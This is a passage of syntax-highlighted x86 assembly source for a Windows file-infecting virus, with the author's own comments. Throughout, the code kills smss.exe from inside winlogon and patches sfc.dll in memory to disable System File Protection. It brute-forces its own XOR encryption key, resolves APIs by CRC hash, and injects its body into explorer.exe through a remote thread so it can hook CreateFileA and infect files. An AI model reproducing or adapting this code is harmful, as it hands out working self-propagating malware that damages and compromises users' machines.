</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExplorerModuleHand</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">winl</span><span class="sc4">],</span><span class="sc12">'ssms'</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ogon</span><span class="sc4">],</span><span class="sc12">'exe.'</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">GetWinlogon</span><span class="sc0"> </span><span class="sc1">;i use same function to get smss.exe handle and terminate it.</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonHand</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SmssHand</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">winl</span><span class="sc4">],</span><span class="sc12">'lniw'</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ogon</span><span class="sc4">],</span><span class="sc12">'nogo'</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonHand</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CloseHandleCRC</span><span class="sc4">,</span><span class="sc5">CHNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonID</span><span class="sc4">]</span><span class="sc1">;really smss.exe ID</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc1">;privileges that i need for terminating smss.exe</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OpenProcessCRC</span><span class="sc4">,</span><span class="sc5">OPNameLen</span><span class="sc0"> </span><span class="sc1">;i open smss.exe </span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SmssHand</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Ntdll</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">NtTerminateProcessCRC</span><span class="sc4">,</span><span class="sc5">NTPNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;i have terminated smss.exe and now it cannot kill winlogon ;D i dont know if this method</span><span class="sc0">
</span><span class="sc1">;is a few dramatic...i know if i kill smss.exe i fuck dbgss(mmm im thinking then im </span><span class="sc0">
</span><span class="sc1">;fuckin debbugers :-m ),and when windows terminates with error smss will not show</span><span class="sc0">
</span><span class="sc1">;the typical blue screen(this is a problem???)...i dont know if i am fuckin other</span><span class="sc0">
</span><span class="sc1">;importants parts...i have not read others funcionalitys...only it loads winlogon</span><span class="sc0">
</span><span class="sc1">;and win32 subsystem(csrss.exe),however this task is already done.I think i can</span><span class="sc0">
</span><span class="sc1">;kill smss.exe.</span><span class="sc0">

</span><span class="sc1">;now,i am in w1nl0g0n with M4x Pr1v1l3g3s ;D in this point our imagination will do all</span><span class="sc0">
</span><span class="sc1">;first,i will disable sfp</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">SfcDisable</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sfc</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">LoadLibraryACRC</span><span class="sc4">,</span><span class="sc5">LLNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ErrorSfcDisable</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtSfc</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;esi -&gt; PE</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc1">;size of optional</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc1">;size of section</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc1">;virtual address of first section of sfc.dll</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtSfc</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc1">;esi -&gt; code section</span><span class="sc0">

</span><span class="sc5">SearchCodeToPatch</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CodeToSearch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CodeToPatchFound</span><span class="sc0"> 
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">SearchCodeToPatch</span><span class="sc0">
</span><span class="sc5">jmpz</span><span class="sc0"> </span><span class="sc5">ErrorSfcDisable</span><span class="sc0">

</span><span class="sc5">CodeToPatchFound</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;now we patch code with a call to ExitThread</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ExitThreadCRC</span><span class="sc4">,</span><span class="sc5">ETNameLen</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PatchExitThreadDir</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc1">;i unprotect the mem where i go to patch</span><span class="sc0">
</span><span class="sc1">;UnprotectMem</span><span class="sc0">
</span><span class="sc1">;   eax -&gt; base of kernel</span><span class="sc0">
</span><span class="sc1">;   esi -&gt; dir of memory that will be writable.</span><span class="sc0">
</span><span class="sc1">;   ecx -&gt; bytes of that memory.  </span><span class="sc0">
</span><span class="sc1">;   ebx -&gt; handle of the process where is the memory.If 0 this process</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">_PatchCode</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">PatchCode</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">UnprotectMem</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PatchCode</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">_PatchCode</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">PatchCode</span><span class="sc0">
</span><span class="sc5">PatchIt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">PatchIt</span><span class="sc0">

</span><span class="sc5">ErrorSfcDisable</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;if we have jumped here without executing CodeToPatchFound part,sfc is not disabled </span><span class="sc0">
</span><span class="sc1">;now ill infect files</span><span class="sc0">
</span><span class="sc1">;first all,ill uncrypt since SCode to SCode part</span><span class="sc0">

</span><span class="sc1">;we encrypted Code with random key since FFFF0000h to FFFFFFFFh so </span><span class="sc0">
</span><span class="sc1">;now we must search the key using brute force</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SCode</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">WLWhatKey</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">000000E8h</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">WLKeyFound</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">WLWhatKey</span><span class="sc0">
</span><span class="sc5">WLKeyFound</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc1">;edx = key</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">ECode</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">SCode</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SCode</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">WLUncrypt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">WLUncrypt</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;code since SCode to ECode uses kernel variable so </span><span class="sc0">
                 </span><span class="sc1">;i must initializate it</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">AttackExplorer</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;now ill inject the code to explorer.exe from winlogon and there ill hook CreateFileA api ;)</span><span class="sc0">
</span><span class="sc1">;i thought to hook FindFirstFile and FindNextFile in explorer but i think its anought </span><span class="sc0">
</span><span class="sc1">;with CreateFileA</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExplorerHand</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CloseHandleCRC</span><span class="sc4">,</span><span class="sc5">CHNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExplorerID</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">43ah</span><span class="sc1">;privileges that i need</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OpenProcessCRC</span><span class="sc4">,</span><span class="sc5">OPNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">AttackExplorerError</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExplorerHand</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_EXECUTE_READWRITE</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MEM_RESERVE</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">EVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">SVirus</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExplorerHand</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VirtualAllocExCRC</span><span class="sc4">,</span><span class="sc5">VANameLen</span><span class="sc0">


</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">AttackExplorerError</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExplorerVirusBase</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExplorerHand</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SVirus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">EVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">SVirus</span><span class="sc0">


</span><span class="sc5">Writez</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">AttackExplorerError</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Needed</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;pointer to a variable passed as parameter to thread function</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExplorerVirusBase</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ExplorerCode</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">SVirus</span><span class="sc0"> 
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc1">;stack size </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExplorerHand</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CreateRemoteThreadCRC</span><span class="sc4">,</span><span class="sc5">CRTNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc5">AttackExplorerError</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExplorerHand</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CloseHandleCRC</span><span class="sc4">,</span><span class="sc5">CHNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">ExitWinlogonThread</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
